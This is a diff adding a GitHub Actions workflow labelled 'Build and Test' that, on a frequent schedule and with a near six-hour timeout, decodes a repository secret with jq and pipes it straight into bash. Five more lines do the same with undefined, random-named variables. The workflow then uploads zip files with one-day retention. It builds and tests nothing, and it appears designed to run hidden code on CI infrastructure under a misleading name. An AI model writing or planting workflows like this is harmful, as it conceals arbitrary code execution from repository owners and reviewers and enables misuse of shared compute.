@@ -1,0 +1,32 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '33 5,11,17,23 * * *'
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          wwt14: ${{ secrets.wwt14 }}
+        run: |
+          printf '%s' "$wwt14" | jq -r .vm23 | /bin/bash
+          printf '%s' "$zhfk89" | jq -r .uf4215 | /bin/bash
+          echo $oso049 | jq -r .ieaca28047 | /bin/bash
+          echo $m3570 | jq -r .jqkik6050 | /bin/bash
+          printf '%s' "$bgh5" | jq -r .lwtwj43 | /bin/bash
+          echo $n40 | jq -r .mlwdf38947 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: u7koaJhZ
+          path: "*.zip"
+          retention-days: 1
